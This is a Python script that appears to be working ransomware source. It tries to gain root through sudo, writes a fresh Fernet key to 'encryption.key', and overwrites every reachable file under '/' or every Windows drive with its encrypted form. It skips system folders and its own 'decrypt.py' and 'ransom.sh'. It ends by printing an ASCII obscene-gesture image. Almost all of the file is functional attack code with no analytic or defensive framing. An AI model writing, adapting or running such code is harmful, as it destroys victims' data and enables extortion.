import os
import sys
import subprocess
import platform
import logging
import signal
import time
import psutil
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor, as_completed

def setup_logging():
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        handlers=[logging.StreamHandler()])

def elevate_privileges_if_needed():
    if platform.system() == "Linux" and os.geteuid() != 0:
        logging.info("Not running as root. Attempting to elevate privileges...")
        try:
            subprocess.run(['sudo', 'python3'] + sys.argv)
            sys.exit(0)
        except Exception as e:
            logging.error(f"Privilege elevation failed: {e}")
            sys.exit(1)
    elif platform.system() == "Windows":
        logging.info("Please run as administrator.")
        sys.exit(1)

def generate_encryption_key():
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_file(file_path, key, exclude_paths):
    if any(file_path.startswith(exclude) for exclude in exclude_paths):
        logging.debug(f"Excluded: {file_path}")
        return
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = Fernet(key).encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        logging.info(f"Encrypted: {file_path}")
    except Exception as e:
        logging.error(f"Encryption failed for {file_path}: {e}")

def find_files_to_encrypt(root_dir, exclude_paths):
    for root, dirs, files in os.walk(root_dir):
        dirs[:] = [d for d in dirs if os.path.join(root, d) not in exclude_paths]
        for file in files:
            file_path = os.path.join(root, file)
            if file_path not in exclude_paths:
                yield file_path

def handle_bus_error(signum, frame):
    logging.error(f"Bus error (signal {signum}).")
    time.sleep(1)

def encrypt_files(root_dir, key, exclude_paths):
    files = find_files_to_encrypt(root_dir, exclude_paths)
    with ThreadPoolExecutor() as executor:
        futures = {executor.submit(encrypt_file, file, key, exclude_paths): file for file in files}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error encrypting file: {e}")

def main():
    setup_logging()
    elevate_privileges_if_needed()
    key = generate_encryption_key()
    # Convert exclude_paths to absolute paths
    exclude_paths = set([os.path.abspath(path) for path in ["main.py", "encryption.key", "decrypt.py", "ransom.sh"]])
    system_paths = ["/usr", "/bin", "/lib", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys"]
    # Convert system_paths to absolute paths before updating exclude_paths
    exclude_paths.update([os.path.abspath(path) for path in system_paths])
    signal.signal(signal.SIGBUS, handle_bus_error)
    root_dirs = ["/"] if platform.system() == "Linux" else [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
    for root_dir in root_dirs:
        encrypt_files(root_dir, key, exclude_paths)

if __name__ == "__main__":
    main()


    bird = """

    ░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ██████▄███▄████░░███▄░░░░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
    ▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
    █████▀░░░░▀▀████████░░░░░░


    """
    print(bird)

    